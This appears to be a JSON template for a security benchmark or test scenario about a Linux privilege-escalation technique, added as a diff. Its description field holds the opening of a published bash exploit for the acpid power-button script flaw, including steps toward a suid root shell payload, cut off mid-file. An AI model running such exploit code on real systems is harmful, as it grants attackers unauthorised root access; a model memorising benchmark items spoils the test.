@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_18228",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: Acpid 1:2.0.10-1ubuntu2 (Ubuntu 11.04/11.10) - Boundary Crossing Privilege Escalation (OSVDB-77592;CVE-2011-2777)\n\nExploit source code (18228.sh):\n```\n# Exploit Title: Acpid Privilege Boundary Crossing Vulnerability\n# Google Dork:\n# Date: 23-11-2011\n# Author: otr\n# Software Link: https://launchpad.net/ubuntu/+source/acpid\n# Version: 1:2.0.10-1ubuntu2\n# Tested on: Ubuntu 11.10, Ubuntu 11.04\n# CVE : CVE-2011-2777\n# --\n# Safeguard this letter, it may be an IMPORTANT DOCUMENT\n\n#!/bin/bash\n#\n# otr\n#\n# The following script is executed when pressing the power button on an Ubuntu\n# 11.10 system. Depending on how far we get in the condition in the code\n# fragement, it is possible for another user on the local system to gain the\n# privileges of the user who has the currently focused display running.  The\n# vulnerability only triggers when certain power management programms are not\n# running, especially kded4 and the programms in the $PMS variable need not to\n# be running in order for this to be exploitable.\n#\n# This exploit would be more reliable when having a way to dos\n# gnome-power-manager Also it would be more fun one could trick the getXuser\n# function into setting $XUSER to root. In the case of root being the user on\n# the active display this exploit turns into a privilege escalation\n#\n# Exploitable file /etc/acpi/powerbtn.sh\n# In original source code line 40\n#\n# --\n# PMS=\"gnome-power-manager kpowersave xfce4-power-manager\"\n# PMS=\"$PMS guidance-power-manager.py dalston-power-applet\"\n#\n# if pidof x $PMS > /dev/null ||\n#        ( test \"$XUSER\" != \"\" && \\\n#\t\tpidof dcopserver > /dev/null && \\\n#\t\ttest -x /usr/bin/dcop && \\\n#\t\t/usr/bin/dcop --user $XUSER kded kded loadedModules \\\n#\t\t | grep -q klaptopdaemon) ||\n#        ( test \"$XUSER\" != \"\" && \\\n#\t\ttest -x /usr/bin/qdbus && \\\n#\t\ttest -r /proc/$(pidof kded4)/environ && \\\n#\t\tsu - $XUSER -c \\\n#\t\t\t\"eval $(echo -n 'export '; cat /proc/$(pidof kded4)/environ | \\\n#\t\t\ttr '\\0' '\\n' | \\\n#\t\t\tgrep DBUS_SESSION_BUS_ADDRESS); \\\n#\t\t\tqdbus org.kde.kded\" | \\\n#\t\t\tgrep -q powerdevil) ;\\\n# then\n# --\n#\n# The problem here is that the output of cat /proc/$(pidof kded4)/environ is\n# controllable by a local user by exporting the DBUS_SESSION_BUS_ADDRESS\n# variable and running a programm called kded4.\n# Using this environment variable the attack is able to inject arbitrary shell\n# commands into the eval expression which will be executed with the rights\n# of $XUSER which is the user with the currently active display.\n#\n# /usr/share/acpi-support/policy-funcs in the PowerDevilRunning function\n# has similar code but it seems that under normal conditions this only\n# allows to run code with the privileges one already has.\n\nPAYLOADEXE=\"/var/crash/payload\"\nPAYLOADC=\"/var/crash/payload.c\"\n\nKDEDC=\"kded4.c\"\nKDEDEXE=\"kded4\"\n\nTRIGGER=\"/etc/acpi/powerbtn.sh\"\n\nrm -f $PAYLOADEXE $KDEDEXE $KDEDC $PAYLOADC\n\necho \"[+] Setting umask to 0 so we have world writable files.\"\numask 0\n\n\necho \"[+] Preparing binary payload.\"\n# we _try_ to get a suid root shell, if not we only get a\n# shell for another user\ncat > $PAYLOADC <<_EOF\n#include <sys/stat.h>\nvoid main(int argc, char **argv)\n{\n\tif(!strstr(argv[0],\"\n```",
+  "cve": "OSVDB-77592;CVE-2011-2777",
+  "exploitdb_id": "18228",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_18228",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
